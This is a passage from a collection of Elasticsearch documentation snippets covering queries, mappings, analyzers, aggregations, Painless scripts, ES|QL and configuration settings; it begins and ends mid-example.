  "location" : "POINT (-71.34 41.12)" 
}

PUT my-index-000001/_doc/3
{
  "text": "Geopoint as an object with 'lat' and 'lon' keys",
  "location": { 
    "lat": 41.12,
    "lon": -71.34
  }
}

PUT my-index-000001/_doc/4
{
  "text": "Geopoint as an array",
  "location": [ -71.34, 41.12 ] 
}

PUT my-index-000001/_doc/5
{
  "text": "Geopoint as a string",
  "location": "41.12,-71.34" 
}

PUT my-index-000001/_doc/6
{
  "text": "Geopoint as a geohash",
  "location": "drm3btev3e86" 
}

GET my-index-000001/_search
{
  "query": {
    "geo_bounding_box": { 
      "location": {
        "top_left": {
          "lat": 42,
          "lon": -72
        },
        "bottom_right": {
          "lat": 40,
          "lon": -74
        }
      }
    }
  }
}

----------------------------------------

TITLE: Analyzing Curl Process Network Traffic with ESQL
DESCRIPTION: Query that calculates total outbound traffic in kilobytes for curl.exe process by destination address. Includes summation, conversion to KB, sorting, and limiting results.

LANGUAGE: esql
CODE:
FROM logs-endpoint
| WHERE process.name == "curl.exe"
| STATS bytes = SUM(destination.bytes) BY destination.address
| EVAL kb =  bytes/1024
| SORT kb DESC
| LIMIT 10
| KEEP kb,destination.address

----------------------------------------

TITLE: Nested kNN Query in Elasticsearch
DESCRIPTION: Shows how to use kNN query within a nested query context for searching nested vector fields.

LANGUAGE: javascript
CODE:
{
  "query" : {
    "nested" : {
      "path" : "paragraph",
        "query" : {
          "knn": {
            "query_vector": [
                0.45,
                45
            ],
            "field": "paragraph.vector",
            "num_candidates": 2
        }
      }
    }
  }
}

----------------------------------------

TITLE: Querying Runtime Fields with Aggregation in Elasticsearch
DESCRIPTION: This example shows how to query the previously defined 'day_of_week' runtime field using a terms aggregation. The query demonstrates how Elasticsearch evaluates the Painless script at query time.

LANGUAGE: json
CODE:
GET seats/_search
{
  "size": 0,
  "fields": [
    "time",
    "day_of_week"
    ],
    "aggs": {
      "day_of_week": {
        "terms": {
          "field": "day_of_week",
          "size": 10
        }
      }
    }
}

----------------------------------------

TITLE: Executing Sparse Vector Query with NLP Model in Elasticsearch
DESCRIPTION: This snippet demonstrates how to use a sparse vector query with an NLP model to convert query text into token-weight pairs. It requires specifying the field, inference ID, and query string.

LANGUAGE: json
CODE:
{
   "query":{
      "sparse_vector": {
        "field": "ml.tokens",
        "inference_id": "the inference ID to produce the token weights",
        "query": "the query string"
      }
   }
}

----------------------------------------

TITLE: Creating a Document with Wait-for-Refresh in Elasticsearch
DESCRIPTION: This example demonstrates how to create a document and wait for it to become visible for search. The refresh parameter is set to wait_for, which waits for the next refresh to occur before responding.

LANGUAGE: console
CODE:
PUT /test/_doc/4?refresh=wait_for
{"test": "test"}

----------------------------------------

TITLE: Configuring JVM Heap Size
DESCRIPTION: Example of setting minimum and maximum heap size in a JVM options file.

LANGUAGE: txt
CODE:
-Xms2g
-Xmx2g

----------------------------------------

TITLE: Analyzing Text with Standard Analyzer in Elasticsearch
DESCRIPTION: Example showing how to analyze text using the standard analyzer with its default configuration. Demonstrates tokenization of a sample sentence.

LANGUAGE: console
CODE:
POST _analyze
{
  "analyzer": "standard",
  "text": "The 2 QUICK Brown-Foxes jumped over the lazy dog's bone."
}

----------------------------------------

TITLE: Phrase Suggester Mapping
DESCRIPTION: Mapping configuration for phrase suggester with trigram and reverse analyzers

LANGUAGE: console
CODE:
PUT test
{
  "settings": {
    "index": {
      "number_of_shards": 1,
      "analysis": {
        "analyzer": {
          "trigram": {
            "type": "custom",
            "tokenizer": "standard",
            "filter": ["lowercase","shingle"]
          },
          "reverse": {
            "type": "custom",
            "tokenizer": "standard",
            "filter": ["lowercase","reverse"]
          }
        },
        "filter": {
          "shingle": {
            "type": "shingle",
            "min_shingle_size": 2,
            "max_shingle_size": 3
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: SELECT with WHERE Clause
DESCRIPTION: Shows how to use the WHERE clause to filter rows in Elasticsearch SQL.

LANGUAGE: sql
CODE:
SELECT last_name FROM emp WHERE emp_no = 10001;

----------------------------------------

TITLE: Excluding Specific Indices in Elasticsearch Search
DESCRIPTION: Demonstrates how to exclude specific indices from a pattern-based search using bool query with must_not clause.

LANGUAGE: console
CODE:
GET /my-index-*/_search
{
  "query": {
    "bool": {
      "must": [
        {
          "match": {
            "user.id": "kimchy"
          }
        }
      ],
      "must_not": [
        {
          "terms": {
            "_index": ["my-index-01"]
          }
        }
      ]
    }
  }
}

----------------------------------------

TITLE: Using MATCH Function in Elasticsearch SQL
DESCRIPTION: The MATCH function allows for full-text search on specific fields. It can be used for single-field searches or multi-field searches with optional boosting and additional parameters.

LANGUAGE: sql
CODE:
MATCH(
    field_exp,   <1>
    constant_exp <2>
    [, options]) <3>

LANGUAGE: sql
CODE:
SELECT author, name FROM library WHERE MATCH(author, 'frank');

LANGUAGE: sql
CODE:
SELECT author, name, SCORE() FROM library WHERE MATCH('author^2,name^5', 'frank dune');

LANGUAGE: sql
CODE:
SELECT author, name, SCORE() FROM library WHERE MATCH(name, 'to the star', 'operator=OR;fuzziness=AUTO:1,5;minimum_should_match=1')
ORDER BY SCORE() DESC LIMIT 2;

----------------------------------------

TITLE: Basic kNN Search Query in Elasticsearch
DESCRIPTION: Executes a kNN search query to find the top 3 nearest vectors from 10 candidates per shard.

LANGUAGE: console
CODE:
POST my-image-index/_search
{
  "size" : 3,
  "query" : {
    "knn": {
      "field": "image-vector",
      "query_vector": [-5, 9, -12],
      "k": 10
    }
  }
}

----------------------------------------

TITLE: Response Filtering with filter_path Parameter
DESCRIPTION: Demonstrates how to use filter_path to reduce API response size by selecting specific fields. Shows basic filtering, wildcard usage, and combining inclusive/exclusive filters.

LANGUAGE: console
CODE:
GET /_search?q=kimchy&filter_path=took,hits.hits._id,hits.hits._score

----------------------------------------

TITLE: Match Query Search Example
DESCRIPTION: Demonstrates the recommended match query for text field searching with example response.

LANGUAGE: console
CODE:
GET my-index-000001/_search?pretty
{
  "query": {
    "match": {
      "full_text": "Quick Brown Foxes!"
    }
  }
}

----------------------------------------

TITLE: Filter Scoring Example in Elasticsearch
DESCRIPTION: Shows three different ways to apply filters in boolean queries, demonstrating how scoring is affected. Includes examples with pure filter, bool query with match_all, and constant_score query.

LANGUAGE: console
CODE:
GET _search
{
  "query": {
    "bool": {
      "filter": {
        "term": {
          "status": "active"
        }
      }
    }
  }
}

LANGUAGE: console
CODE:
GET _search
{
  "query": {
    "bool": {
      "must": {
        "match_all": {}
      },
      "filter": {
        "term": {
          "status": "active"
        }
      }
    }
  }
}

LANGUAGE: console
CODE:
GET _search
{
  "query": {
    "constant_score": {
      "filter": {
        "term": {
          "status": "active"
        }
      }
    }
  }
}

----------------------------------------

TITLE: Hybrid Search Combining Semantic and Lexical Queries in Elasticsearch
DESCRIPTION: This example shows how to perform a hybrid search by combining a semantic query with a lexical query. It searches for "mountain lake" in both the title field (lexical) and title_semantic field (semantic), with different boost values.

LANGUAGE: console
CODE:
POST my-index/_search
{
  "size" : 3,
  "query": {
    "bool": {
      "should": [
        {
          "match": {
            "title": {
              "query": "mountain lake",
              "boost": 1
            }
          }
        },
        {
          "semantic": {
            "field": "title_semantic",
            "query": "mountain lake",
            "boost": 2
          }
        }
      ]
    }
  }
}

----------------------------------------

TITLE: Counting Array Elements in Painless
DESCRIPTION: Script that counts the number of elements in the actors array field using doc values. Works with keyword fields by default.

LANGUAGE: painless
CODE:
doc['actors'].size()

----------------------------------------

TITLE: Source Filtering in Elasticsearch Search
DESCRIPTION: This snippet shows how to use '_source' filtering in Elasticsearch to control which fields are returned in the search response. It includes examples of excluding the source, using wildcards, and complex includes/excludes patterns.

LANGUAGE: console
CODE:
GET /_search
{
  "_source": false,
  "query": {
    "match": {
      "user.id": "kimchy"
    }
  }
}

LANGUAGE: console
CODE:
GET /_search
{
  "_source": "obj.*",
  "query": {
    "match": {
      "user.id": "kimchy"
    }
  }
}

LANGUAGE: console
CODE:
GET /_search
{
  "_source": {
    "includes": [ "obj1.*", "obj2.*" ],
    "excludes": [ "*.description" ]
  },
  "query": {
    "term": {
      "user.id": "kimchy"
    }
  }
}

----------------------------------------

TITLE: Configuring Fixed Thread Pool in Elasticsearch
DESCRIPTION: Configuration example for a fixed thread pool type with size and queue_size parameters defined.

LANGUAGE: yaml
CODE:
thread_pool:
    write:
        size: 30
        queue_size: 1000

----------------------------------------

TITLE: SELECT with ORDER BY Clause
DESCRIPTION: Shows how to use the ORDER BY clause to sort results in Elasticsearch SQL.

LANGUAGE: sql
CODE:
SELECT * FROM library ORDER BY page_count DESC LIMIT 5;

----------------------------------------

TITLE: Indexing a Polygon with a hole in WKT format
DESCRIPTION: Example of indexing a polygon with a hole using the Well-Known Text (WKT) format in Elasticsearch. The first set of coordinates represents the outer boundary, and the second set represents the interior hole.

LANGUAGE: console
CODE:
POST /example/_doc
{
  "location" : "POLYGON ((1000.0 1000.0, 1001.0 1000.0, 1001.0 1001.0, 1000.0 1001.0, 1000.0 1000.0), (1000.2 1000.2, 1000.8 1000.2, 1000.8 1000.8, 1000.2 1000.8, 1000.2 1000.2))"
}

----------------------------------------

TITLE: Executing Average Bucket Aggregation Query in Elasticsearch
DESCRIPTION: This example shows a complete Elasticsearch query that uses the average bucket aggregation to calculate average monthly sales. It combines a date histogram aggregation with a sum aggregation and then applies the average bucket aggregation.

LANGUAGE: console
CODE:
POST _search
{
  "size": 0,
  "aggs": {
    "sales_per_month": {
      "date_histogram": {
        "field": "date",
        "calendar_interval": "month"
      },
      "aggs": {
        "sales": {
          "sum": {
            "field": "price"
          }
        }
      }
    },
    "avg_monthly_sales": {
      "avg_bucket": {
        "buckets_path": "sales_per_month>sales",
        "gap_policy": "skip",
        "format": "#,##0.00;(#,##0.00)"
      }
    }
  }
}

----------------------------------------

TITLE: Configuring Write Thread Pool in Elasticsearch
DESCRIPTION: Example showing how to configure the write thread pool by setting its size parameter in elasticsearch.yml.

LANGUAGE: yaml
CODE:
thread_pool:
    write:
        size: 30

----------------------------------------

TITLE: Aggregating Windows Event Logs with ESQL
DESCRIPTION: Query that aggregates and enriches Windows event logs by counting events per code and host, enriching with event descriptions. Includes filtering, sorting, and field selection operations.

LANGUAGE: esql
CODE:
FROM logs-*
| WHERE event.code IS NOT NULL
| STATS event_code_count = COUNT(event.code) BY event.code,host.name
| ENRICH win_events ON event.code WITH event_description
| WHERE event_description IS NOT NULL and host.name IS NOT NULL
| RENAME event_description AS event.description
| SORT event_code_count DESC
| KEEP event_code_count,event.code,host.name,event.description

----------------------------------------

TITLE: ELSER Query Implementation Example
DESCRIPTION: Example of text expansion query using the ELSER model for semantic search functionality.

LANGUAGE: console
CODE:
GET my-index/_search
{
   "query":{
      "text_expansion":{
         "ml.tokens":{
            "model_id":".elser_model_2",
            "model_text":"How is the weather in Jamaica?"
         }
      }
   }
}

----------------------------------------

TITLE: Query Rescoring in Elasticsearch
DESCRIPTION: Implements query rescoring to improve precision by reordering top search results using a secondary algorithm with customizable weights.

LANGUAGE: json
CODE:
POST /_search
{
   "query" : {
      "match" : {
         "message" : {
            "operator" : "or",
            "query" : "the quick brown"
         }
      }
   },
   "rescore" : {
      "window_size" : 50,
      "query" : {
         "rescore_query" : {
            "match_phrase" : {
               "message" : {
                  "query" : "the quick brown",
                  "slop" : 2
               }
            }
         },
         "query_weight" : 0.7,
         "rescore_query_weight" : 1.2
      }
   }
}

----------------------------------------

TITLE: Geo-distance Query with Lat-Lon Properties in Elasticsearch
DESCRIPTION: Shows how to specify the location using latitude and longitude properties in a geo_distance query.

LANGUAGE: console
CODE:
GET /my_locations/_search
{
  "query": {
    "bool": {
      "must": {
        "match_all": {}
      },
      "filter": {
        "geo_distance": {
          "distance": "12km",
          "pin.location": {
            "lat": 40,
            "lon": -70
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Basic More Like This Query in Elasticsearch
DESCRIPTION: Simple example of using more_like_this query to find documents similar to a text string in specified fields. Demonstrates setting min_term_freq and max_query_terms parameters.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "more_like_this" : {
      "fields" : ["title", "description"],
      "like" : "Once upon a time",
      "min_term_freq" : 1,
      "max_query_terms" : 12
    }
  }
}

----------------------------------------

TITLE: Combining Query and Filter Contexts in Elasticsearch Search API
DESCRIPTION: This example demonstrates how to use query and filter contexts together in an Elasticsearch search query. It shows how to match documents based on full-text search criteria and exact value filters, illustrating the practical application of both contexts.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "bool": {
      "must": [
        { "match": { "title":   "Search"        }},
        { "match": { "content": "Elasticsearch" }}
      ],
      "filter": [
        { "term":  { "status": "published" }},
        { "range": { "publish_date": { "gte": "2015-01-01" }}}
      ]
    }
  }
}

----------------------------------------

TITLE: Creating Custom Normalizer in Elasticsearch
DESCRIPTION: Example showing how to create a custom normalizer with character filters and token filters. The normalizer converts special quotes to standard quotes, applies lowercase transformation, and performs ASCII folding. It is applied to a keyword field named 'foo'.

LANGUAGE: console
CODE:
PUT index
{
  "settings": {
    "analysis": {
      "char_filter": {
        "quote": {
          "type": "mapping",
          "mappings": [
            "« => \"",
            "» => \""
          ]
        }
      },
      "normalizer": {
        "my_normalizer": {
          "type": "custom",
          "char_filter": ["quote"],
          "filter": ["lowercase", "asciifolding"]
        }
      }
    }
  },
  "mappings": {
    "properties": {
      "foo": {
        "type": "keyword",
        "normalizer": "my_normalizer"
      }
    }
  }
}

----------------------------------------

TITLE: Configuring Drop Processor in Elasticsearch Pipeline
DESCRIPTION: Example configuration of a drop processor that prevents documents from being indexed when the network_name field equals 'Guest'. The processor uses conditional execution and can be configured with various options including description, error handling, and tagging.

LANGUAGE: json
CODE:
{
  "drop": {
    "if" : "ctx.network_name == 'Guest'"
  }
}

----------------------------------------

TITLE: Significant Text Aggregation with Duplicate Text Filtering in Elasticsearch
DESCRIPTION: This query demonstrates the use of the filter_duplicate_text option in significant text aggregation to remove duplicate content and improve result quality.

LANGUAGE: console
CODE:
GET news/_search
{
  "query": {
    "match": {
      "content": "elasticsearch"
    }
  },
  "aggs": {
    "sample": {
      "sampler": {
        "shard_size": 100
      },
      "aggs": {
        "keywords": {
          "significant_text": {
            "field": "content",
            "filter_duplicate_text": true
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Concatenating Strings with CONCAT in Elasticsearch SQL
DESCRIPTION: This snippet demonstrates how to use the CONCAT function in ESQL to combine first and last names into a full name. It selects data from the 'employees' table, keeps only the first_name and last_name columns, and then creates a new column 'fullname' by concatenating these fields with a space in between.

LANGUAGE: sql
CODE:
FROM employees
| KEEP first_name, last_name
| EVAL fullname = CONCAT(first_name, " ", last_name)

----------------------------------------

TITLE: Search-as-you-type Implementation
DESCRIPTION: Complete example demonstrating how to set up a field for search-as-you-type functionality using edge_ngram tokenizer with separate index and search analyzers.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "settings": {
    "analysis": {
      "analyzer": {
        "autocomplete": {
          "tokenizer": "autocomplete",
          "filter": [
            "lowercase"
          ]
        },
        "autocomplete_search": {
          "tokenizer": "lowercase"
        }
      },
      "tokenizer": {
        "autocomplete": {
          "type": "edge_ngram",
          "min_gram": 2,
          "max_gram": 10,
          "token_chars": [
            "letter"
          ]
        }
      }
    }
  },
  "mappings": {
    "properties": {
      "title": {
        "type": "text",
        "analyzer": "autocomplete",
        "search_analyzer": "autocomplete_search"
      }
    }
  }
}

PUT my-index-000001/_doc/1
{
  "title": "Quick Foxes"
}

POST my-index-000001/_refresh

GET my-index-000001/_search
{
  "query": {
    "match": {
      "title": {
        "query": "Quick Fo",
        "operator": "and"
      }
    }
  }
}

----------------------------------------

TITLE: Basic COUNT_DISTINCT Usage in ESQL
DESCRIPTION: Demonstrates basic usage of COUNT_DISTINCT function to count unique IP addresses across multiple columns. Shows how to apply the function to different fields in a single query.

LANGUAGE: esql
CODE:
FROM hosts
| STATS COUNT_DISTINCT(ip0), COUNT_DISTINCT(ip1)

----------------------------------------

TITLE: Analyzing Text with Keyword Repeat Filter in Elasticsearch
DESCRIPTION: This example uses the analyze API to demonstrate the keyword_repeat filter, which outputs both keyword and non-keyword versions of each token in the input text.

LANGUAGE: console
CODE:
GET /_analyze
{
  "tokenizer": "whitespace",
  "filter": [
    "keyword_repeat"
  ],
  "text": "fox running and jumping",
  "explain": true,
  "attributes": "keyword"
}

----------------------------------------

TITLE: Configuring Scripted Metrics Aggregation Permissions
DESCRIPTION: Dynamic settings to control which scripts can be used in scripted metrics aggregations. Includes flags for enabling script restrictions and lists of allowed inline and stored scripts.

LANGUAGE: yaml
CODE:
search.aggs.only_allowed_metric_scripts: [boolean]
search.aggs.allowed_inline_metric_scripts: [string list]
search.aggs.allowed_stored_metric_scripts: [string list]

----------------------------------------

TITLE: Configuring Indexing Slow Log Settings in Elasticsearch log4j2.properties
DESCRIPTION: This YAML snippet illustrates how to configure indexing slow log settings across all indices using the log4j2.properties configuration file in Elasticsearch. It sets thresholds for different log levels and includes options for source logging and reformatting.

LANGUAGE: yaml
CODE:
index.indexing.slowlog.threshold.index.warn: 10s
index.indexing.slowlog.threshold.index.info: 5s
index.indexing.slowlog.threshold.index.debug: 2s
index.indexing.slowlog.threshold.index.trace: 500ms

index.indexing.slowlog.source: 1000
index.indexing.slowlog.reformat: true

index.indexing.slowlog.include.user: true

----------------------------------------

TITLE: Implementing Custom Token Filter in Java
DESCRIPTION: This Java class implements a custom token filter that only accepts 'hello' and 'world' tokens. It extends FilteringTokenFilter and overrides the accept() method to implement the filtering logic.

LANGUAGE: java
CODE:
package org.example;

import org.apache.lucene.analysis.FilteringTokenFilter;
import org.apache.lucene.analysis.TokenStream;
import org.apache.lucene.analysis.tokenattributes.CharTermAttribute;

import java.util.Arrays;

public class HelloWorldTokenFilter extends FilteringTokenFilter {
    private final CharTermAttribute term = addAttribute(CharTermAttribute.class);

    public HelloWorldTokenFilter(TokenStream input) {
        super(input);
    }

    @Override
    public boolean accept() {
        if (term.length() != 5) return false;
        return Arrays.equals(term.buffer(), 0, 4, "hello".toCharArray(), 0, 4)
                || Arrays.equals(term.buffer(), 0, 4, "world".toCharArray(), 0, 4);
    }
}

----------------------------------------

TITLE: Multi Terms Aggregation with Sub-aggregations
DESCRIPTION: Demonstrates using sub-aggregations and custom sorting based on metric calculations within multi terms aggregation.

LANGUAGE: console
CODE:
GET /products/_search
{
  "aggs": {
    "genres_and_products": {
      "multi_terms": {
        "terms": [
          {
            "field": "genre"
          },
          {
            "field": "product"
          }
        ],
        "order": {
          "total_quantity": "desc"
        }
      },
      "aggs": {
        "total_quantity": {
          "sum": {
            "field": "quantity"
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Using Script Fields in Elasticsearch Search
DESCRIPTION: This snippet demonstrates how to use the 'script_fields' parameter to retrieve script evaluations based on different fields for each hit. It includes examples of simple calculations and accessing the _source document.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "match_all": {}
  },
  "script_fields": {
    "test1": {
      "script": {
        "lang": "painless",
        "source": "doc['price'].value * 2"
      }
    },
    "test2": {
      "script": {
        "lang": "painless",
        "source": "doc['price'].value * params.factor",
        "params": {
          "factor": 2.0
        }
      }
    }
  }
}

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "match_all": {}
  },
  "script_fields": {
    "test1": {
      "script": "params['_source']['message']"
    }
  }
}

----------------------------------------

TITLE: Nested Inner Hits Example in Elasticsearch
DESCRIPTION: This example demonstrates how to use nested inner hits in Elasticsearch. It includes creating a mapping with nested fields, indexing a document, and performing a search with nested inner hits.

LANGUAGE: console
CODE:
PUT test
{
  "mappings": {
    "properties": {
      "comments": {
        "type": "nested"
      }
    }
  }
}

PUT test/_doc/1?refresh
{
  "title": "Test title",
  "comments": [
    {
      "author": "kimchy",
      "number": 1
    },
    {
      "author": "nik9000",
      "number": 2
    }
  ]
}

POST test/_search
{
  "query": {
    "nested": {
      "path": "comments",
      "query": {
        "match": {"comments.number" : 2}
      },
      "inner_hits": {} <1>
    }
  }
}

----------------------------------------

TITLE: Object Field Processing with Foreach
DESCRIPTION: Shows how to process object fields using foreach processor, including accessing and modifying object keys and values.

LANGUAGE: javascript
CODE:
{
  "products" : {
    "widgets" : {
      "total_sales" : 50,
      "unit_price": 1.99,
      "display_name": ""
    },
    "sprockets" : {
      "total_sales" : 100,
      "unit_price": 9.99,
      "display_name": "Super Sprockets"
    },
    "whizbangs" : {
      "total_sales" : 200,
      "unit_price": 19.99,
      "display_name": "Wonderful Whizbangs"
    }
  }
}

LANGUAGE: javascript
CODE:
{
  "foreach": {
    "field": "products",
    "processor": {
      "uppercase": {
        "field": "_ingest._value.display_name"
      }
    }
  }
}

----------------------------------------

TITLE: Creating Field Alias Mapping in Elasticsearch
DESCRIPTION: Example showing how to create an index with a field alias mapping and perform a search query using the alias. The mapping creates an alias 'route_length_miles' that points to a 'distance' field of type long.

LANGUAGE: console
CODE:
PUT trips
{
  "mappings": {
    "properties": {
      "distance": {
        "type": "long"
      },
      "route_length_miles": {
        "type": "alias",
        "path": "distance"
      },
      "transit_mode": {
        "type": "keyword"
      }
    }
  }
}

GET _search
{
  "query": {
    "range" : {
      "route_length_miles" : {
        "gte" : 39
      }
    }
  }
}

----------------------------------------

TITLE: Creating an Index with Dense Vector Field
DESCRIPTION: This snippet demonstrates how to create an index with a dense_vector field and insert documents with vector values.

LANGUAGE: console
CODE:
PUT my-index
{
  "mappings": {
    "properties": {
      "my_vector": {
        "type": "dense_vector",
        "dims": 3
      },
      "my_text" : {
        "type" : "keyword"
      }
    }
  }
}

PUT my-index/_doc/1
{
  "my_text" : "text1",
  "my_vector" : [0.5, 10, 6]
}

PUT my-index/_doc/2
{
  "my_text" : "text2",
  "my_vector" : [-0.5, 10, 10]
}

----------------------------------------

TITLE: Calculating Total Goals Using Painless in Script Fields
DESCRIPTION: This snippet demonstrates how to use a Painless script to calculate a player's total goals as a script field in the search response.

LANGUAGE: console
CODE:
GET hockey/_search
{
  "query": {
    "match_all": {}
  },
  "script_fields": {
    "total_goals": {
      "script": {
        "lang": "painless",
        "source": """
          int total = 0;
          for (int i = 0; i < doc['goals'].length; ++i) {
            total += doc['goals'][i];
          }
          return total;
        """
      }
    }
  }
}

----------------------------------------

TITLE: Combined Fields Query with Field Boosting in Elasticsearch
DESCRIPTION: This example shows how to apply field boosting in a combined_fields query, giving more weight to matches in the title field compared to the body field.

LANGUAGE: json
CODE:
GET /_search
{
  "query": {
    "combined_fields" : {
      "query" : "distributed consensus",
      "fields" : [ "title^2", "body" ]
    }
  }
}

----------------------------------------

TITLE: Calculating First Order Derivative of Monthly Sales in Elasticsearch
DESCRIPTION: Demonstrates how to calculate the derivative of total monthly sales using a date histogram and derivative aggregation. The buckets_path parameter points to the 'sales' aggregation.

LANGUAGE: console
CODE:
POST /sales/_search
{
  "size": 0,
  "aggs": {
    "sales_per_month": {
      "date_histogram": {
        "field": "date",
        "calendar_interval": "month"
      },
      "aggs": {
        "sales": {
          "sum": {
            "field": "price"
          }
        },
        "sales_deriv": {
          "derivative": {
            "buckets_path": "sales"
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Simple Painless Filter Condition
DESCRIPTION: A basic Painless script that filters documents based on 'sold' status and 'cost' value, returning only unsold items under $25.

LANGUAGE: painless
CODE:
doc['sold'].value == false && doc['cost'].value < 25

----------------------------------------

TITLE: Configuring ignore_malformed for Elasticsearch Index Mapping
DESCRIPTION: This snippet demonstrates how to set up an Elasticsearch index with ignore_malformed enabled for one field but not another. It shows the different behavior when indexing malformed data into these fields.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "mappings": {
    "properties": {
      "number_one": {
        "type": "integer",
        "ignore_malformed": true
      },
      "number_two": {
        "type": "integer"
      }
    }
  }
}

PUT my-index-000001/_doc/1
{
  "text":       "Some text value",
  "number_one": "foo"
}

PUT my-index-000001/_doc/2
{
  "text":       "Some text value",
  "number_two": "foo"
}

----------------------------------------

TITLE: Implementing Global Aggregation with Price Averaging in Elasticsearch
DESCRIPTION: Example showing how to use global aggregation to compute average prices across all products while simultaneously calculating averages for a specific query filter. The global aggregation creates a bucket of all documents regardless of the query constraints.

LANGUAGE: console
CODE:
POST /sales/_search?size=0
{
  "query": {
    "match": { "type": "t-shirt" }
  },
  "aggs": {
    "all_products": {
      "global": {},
      "aggs": {
      "avg_price": { "avg": { "field": "price" } }
      }
    },
    "t_shirts": { "avg": { "field": "price" } }
  }
}

LANGUAGE: console
CODE:
{
  ...
  "aggregations": {
    "all_products": {
      "doc_count": 7,
      "avg_price": {
        "value": 140.71428571428572
      }
    },
    "t_shirts": {
      "value": 128.33333333333334
    }
  }
}

----------------------------------------

TITLE: Creating an Index for Distance Feature Query in Elasticsearch
DESCRIPTION: This snippet demonstrates how to create an 'items' index with appropriate field mappings for use with the distance_feature query. It includes fields for name (keyword), production_date (date), and location (geo_point).

LANGUAGE: console
CODE:
PUT /items
{
  "mappings": {
    "properties": {
      "name": {
        "type": "keyword"
      },
      "production_date": {
        "type": "date"
      },
      "location": {
        "type": "geo_point"
      }
    }
  }
}

----------------------------------------

TITLE: Cluster-Wide Search in Elasticsearch
DESCRIPTION: Shows three equivalent methods to search across all indices in an Elasticsearch cluster using different path specifications.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "match": {
      "user.id": "kimchy"
    }
  }
}

GET /_all/_search
{
  "query": {
    "match": {
      "user.id": "kimchy"
    }
  }
}

GET /*/_search
{
  "query": {
    "match": {
      "user.id": "kimchy"
    }
  }
}

----------------------------------------

TITLE: Term Query Search Example
DESCRIPTION: Shows how to perform a term query search with pretty-printed results.

LANGUAGE: console
CODE:
GET my-index-000001/_search?pretty
{
  "query": {
    "term": {
      "full_text": "Quick Brown Foxes!"
    }
  }
}

----------------------------------------

TITLE: Basic Stats Aggregation Query in Elasticsearch
DESCRIPTION: Demonstrates how to perform a basic stats aggregation on a numeric field 'grade' in Elasticsearch. Returns min, max, sum, count, and average statistics.

LANGUAGE: console
CODE:
POST /exams/_search?size=0
{
  "aggs": {
    "grades_stats": { "stats": { "field": "grade" } }
  }
}

LANGUAGE: console-result
CODE:
{
  ...

  "aggregations": {
    "grades_stats": {
      "count": 2,
      "min": 50.0,
      "max": 100.0,
      "avg": 75.0,
      "sum": 150.0
    }
  }
}

----------------------------------------

TITLE: Indexing Document with Nested Fields
DESCRIPTION: Indexes a product document with nested reseller information including company names and prices.

LANGUAGE: console
CODE:
PUT /products/_doc/0?refresh
{
  "name": "LED TV",
  "resellers": [
    {
      "reseller": "companyA",
      "price": 350
    },
    {
      "reseller": "companyB",
      "price": 500
    }
  ]
}

----------------------------------------

TITLE: Multi-level Nested Query Example in Elasticsearch
DESCRIPTION: Shows how to query multi-level nested documents to find specific vehicle make and model combinations.

LANGUAGE: console
CODE:
GET /drivers/_search
{
  "query": {
    "nested": {
      "path": "driver",
      "query": {
        "nested": {
          "path": "driver.vehicle",
          "query": {
            "bool": {
              "must": [
                { "match": { "driver.vehicle.make": "Powell Motors" } },
                { "match": { "driver.vehicle.model": "Canyonero" } }
              ]
            }
          }
        }
      }
    }
  }
}

----------------------------------------

TITLE: Basic Term Query Example
DESCRIPTION: Demonstrates how to perform a basic term query search with optional boost parameter for exact matching of values.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "term": {
      "user.id": {
        "value": "kimchy",
        "boost": 1.0
      }
    }
  }
}

----------------------------------------

TITLE: Enabling Metadata Fields in ESQL FROM Command
DESCRIPTION: This snippet demonstrates how to enable access to metadata fields using the FROM source command with the METADATA directive.

LANGUAGE: esql
CODE:
FROM index METADATA _index, _id

----------------------------------------

TITLE: Generating a CA Certificate and Private Key
DESCRIPTION: This example demonstrates how to generate a Certificate Authority (CA) certificate and private key in PKCS#12 format using the elasticsearch-certutil command.

LANGUAGE: shell
CODE:
bin/elasticsearch-certutil ca

----------------------------------------

TITLE: Function Score Query with Multiple Functions
DESCRIPTION: Example showing how to combine multiple scoring functions with filters in a function_score query.

LANGUAGE: console
CODE:
GET /_search
{
  "query": {
    "function_score": {
      "query": { "match_all": {} },
      "boost": "5",
      "functions": [
        {
          "filter": { "match": { "test": "bar" } },
          "random_score": {},
          "weight": 23
        },
        {
          "filter": { "match": { "test": "cat" } },
          "weight": 42
        }
      ],
      "max_boost": 42,
      "score_mode": "max",
      "boost_mode": "multiply",
      "min_score": 42
    }
  }
}

----------------------------------------

TITLE: Customizing HTML Strip Filter with Escaped Tags
DESCRIPTION: Creates an index with a custom HTML strip filter that preserves specific HTML tags. This example shows how to configure the filter to skip removing <b> tags while stripping other HTML elements.

LANGUAGE: console
CODE:
PUT my-index-000001
{
  "settings": {
    "analysis": {
      "analyzer": {
        "my_analyzer": {
          "tokenizer": "keyword",
          "char_filter": [
            "my_custom_html_strip_char_filter"
          ]
        }
      },
      "char_filter": {
        "my_custom_html_strip_char_filter": {
          "type": "html_strip",
          "escaped_tags": [
            "b"
          ]
        }
      }
    }
  }
}

----------------------------------------

TITLE: Multi Terms Aggregation with Missing Values
DESCRIPTION: Shows how to handle missing values in multi terms aggregation by specifying a default value for missing fields.

LANGUAGE: console
CODE:
GET /products/_search
{
  "aggs": {
    "genres_and_products": {
      "multi_terms": {
        "terms": [
          {
            "field": "genre"
          },
          {
            "field": "product",
            "missing": "Product Z"
          }
        ]
      }
    }
  }
}

----------------------------------------

TITLE: Including and Excluding Fields from _source in Elasticsearch
DESCRIPTION: This example demonstrates how to include or exclude specific fields from the _source field in Elasticsearch using includes and excludes parameters. It also shows indexing a document and searching on an excluded field.

LANGUAGE: console
CODE:
PUT logs
{
  "mappings": {
    "_source": {
      "includes": [
        "*.count",
        "meta.*"
      ],
      "excludes": [
        "meta.description",
        "meta.other.*"
      ]
    }
  }
}

PUT logs/_doc/1
{
  "requests": {
    "count": 10,
